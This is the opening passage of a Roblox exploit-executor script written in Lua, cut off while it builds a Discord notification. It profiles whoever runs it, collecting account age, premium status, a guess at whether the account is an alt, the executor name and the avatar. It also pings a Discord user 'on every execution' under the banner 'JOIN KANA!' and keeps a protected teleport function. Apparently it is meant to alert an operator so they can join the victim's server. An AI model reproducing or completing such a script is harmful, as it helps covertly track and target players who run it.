_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.

local player = game:GetService("Players").LocalPlayer

-- ✅ cache Teleport function before Delta or others can tamper it
local TeleportService = game:GetService("TeleportService")
local realTP = TeleportService.TeleportToPlaceInstance
local function safeTeleport(placeId, jobId)
    realTP(TeleportService, placeId, jobId, player)
end

local joinTime = os.time() - (player.AccountAge * 86400)
local joinDate = os.date("!*t", joinTime)

local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
end

if not premium and player.AccountAge >= 0 then
    alt = "Possible"
elseif premium and player.AccountAge >= 0 then
    alt = false
end

local executor = identifyexecutor() or "Unknown"

local Thing =
    game:HttpGet(
    string.format(
        "https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",
        player.UserId
    )
)
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl

local msg = {
    ["username"] = "JOIN KANA!",
